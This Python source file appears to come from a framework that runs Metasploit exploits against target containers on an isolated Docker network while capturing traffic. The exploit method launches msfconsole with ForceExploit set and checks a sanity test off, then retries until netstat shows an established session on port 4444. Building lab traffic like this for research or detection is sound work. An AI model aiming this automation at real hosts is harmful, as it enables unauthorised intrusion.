import logging
import shlex
import sys
import time
from abc import ABC, abstractmethod
import docker
from utils import safe_stop_remove

logger = logging.getLogger(__name__)


class BaseRunner(ABC):
    def __init__(self, docker_client, network_name="set_framework_net",
                 volume_name="set_logs", target_name="target", 
                 msf_image="metasploitframework/metasploit-framework:6.2.33"):
        self.client=docker_client
        self.network=network_name
        self.volume=volume_name
        self.msf_image=msf_image
        self.target_name=target_name
        self.exploit_success_pattern="4444"

    def network_setup(self):
        net = None
        networks = [i.name for i in self.client.networks.list()]
        if self.network in networks:
            net = self.client.networks.get(self.network)
        else:
            net = self.client.networks.create(self.network, driver="bridge")
        return net

    def volume_setup(self):
        vol = None
        vols = [i.name for i in self.client.volumes.list()]
        if self.volume in vols:
            vol = self.client.volumes.get(self.volume)
        else:
            vol = self.client.volumes.create(name=self.volume)
        return vol

    @abstractmethod
    def target_setup(self):
        pass

    @abstractmethod
    def target_cleanup(self):
        pass

    @staticmethod
    def _progress_dot():
        sys.stderr.write(".")
        sys.stderr.flush()

    @staticmethod
    def _progress_end():
        sys.stderr.write("\n")
        sys.stderr.flush()

    @abstractmethod
    def tcpdump_setup(self):
        pass

    @abstractmethod
    def tcpdump_cleanup(self):
        pass

    def attack_setup(self):
        #TODO: moigrate this over th the base class
        logger.debug("Starting attack system for %s", self.target_name)
        dk_attack = self.client.containers.run(self.msf_image,
                                 detach=True, name="%s-attack" % self.target_name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self):
        safe_stop_remove(self.attack, label="%s-attack" % self.target_name)

    def setup_all(self):
        self.network_setup()
        self.volume_setup()
        self.target_setup()
        self.tcpdump_setup()
        self.attack_setup()

    def cleanup_all(self):
        self.target_cleanup()
        self.attack_cleanup()

    def exploit(self):
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        logger.debug("Running exploit for %s", self.target_name)
        args = args % (self.msf_exploit, self.msf_options, self.target_name, "%s-attack" % self.target_name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self, pattern=4444):
        #TODO: create config support for custom exploit estabilished pattern
        cmd = ["sh", "-c", f"netstat | grep {shlex.quote(str(pattern))} | grep ESTABLISHED"]
        try:
            result = self.attack.exec_run(cmd=cmd, tty=True)
        except (docker.errors.NotFound, docker.errors.APIError) as e:
            logger.warning("Could not check exploit status: %s", e)
            return False
        cmd_result = str(result.output)
        self._progress_dot()
        for line in cmd_result.splitlines():
            if pattern in str(line) and "ESTABLISHED" in str(line):
                self._progress_end()
                logger.info("Exploit of %s success", self.target_name)
                return True
        return False

    def exploit_until_success(self, status_delay=3, status_checks=7, tries=4):
        for i in range(tries):
            self.exploit()
            for i in range (status_checks):
                if self.exploit_success(pattern=self.exploit_success_pattern):
                    return True
                time.sleep(status_delay)
            self._progress_end()
        logger.warning("Exploit failed or status unknown")
        return False

    @abstractmethod
    def ready_to_exploit(self):
        pass
